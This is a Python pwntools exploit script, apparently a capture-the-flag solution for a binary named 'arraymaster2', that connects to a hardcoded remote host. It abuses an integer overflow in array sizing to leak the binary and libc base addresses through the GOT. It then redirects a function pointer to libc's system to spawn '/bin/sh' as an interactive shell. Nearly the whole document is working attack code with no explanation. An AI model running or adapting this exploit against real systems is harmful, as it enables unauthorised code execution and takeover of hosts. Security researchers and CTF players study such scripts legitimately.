#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('arraymaster2')

host = args.HOST or '35.207.132.47'
port = int(args.PORT or 22229)

env = {'LD_PRELOAD':'./libc-2.27.so'}
libc = ELF(env['LD_PRELOAD'])
def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, env=env, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, env=env, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

context.terminal = ['gnome-terminal', '-e']
gdbscript = '''
#break *0x400B1C
#break *0x400B3E
#break *0x400B29
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
io.recvuntil('anyway')

io.sendlineafter('quit', 'init A 64 {}'.format(2305843009213693953))
io.sendlineafter('quit', 'init B 64 1')

io.sendlineafter('quit', 'get A 7')
io.recvuntil('>')
addr = int(io.recvline().strip()) - exe.symbols['int64_get']
log.success('binary base: {}'.format(hex(addr)))

io.sendlineafter('quit', 'set A 4 {}'.format(exe.got['puts'] / 8 + 1))
io.sendlineafter('quit', 'set A 6 {}'.format(addr))
io.sendlineafter('quit', 'get B {}'.format(exe.got['puts'] / 8))

io.recvuntil('>')
addr = int(io.recvline().strip()) - libc.symbols['puts']
log.success('libc base: {}'.format(hex(addr)))
libc.address = addr

io.sendlineafter('quit', 'set A 7 {}'.format(libc.symbols['system']))
io.sendlineafter('quit', 'set A 4 {}'.format(u64("/bin/sh\x00")))
io.sendlineafter('quit', 'get B 0')

io.interactive()

